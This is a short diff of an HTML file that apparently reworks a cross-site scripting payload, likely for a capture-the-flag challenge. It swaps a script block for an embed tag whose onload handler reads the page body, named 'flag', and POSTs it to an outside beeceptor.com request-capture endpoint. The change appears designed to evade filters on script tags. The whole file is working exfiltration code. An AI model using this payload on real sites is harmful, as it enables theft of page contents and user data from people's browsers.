@@ -1,16 +1,10 @@
-<!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Example HTML File</title>
-  </head>
-  <body>
-    <script>
-      let flag = document.body.innerHTML;
+ <body>
+   <embed onload="let flag = document.body.innerHTML;
       var xhr = new XMLHttpRequest();
       xhr.open('POST', 'https://alexyqiu.free.beeceptor.com', true);
       xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
-      xhr.send(JSON.stringify(flag));
-    </script>
-  </body>
+      xhr.send(JSON.stringify(flag));">
+ </embed>
+</body>
 </html>
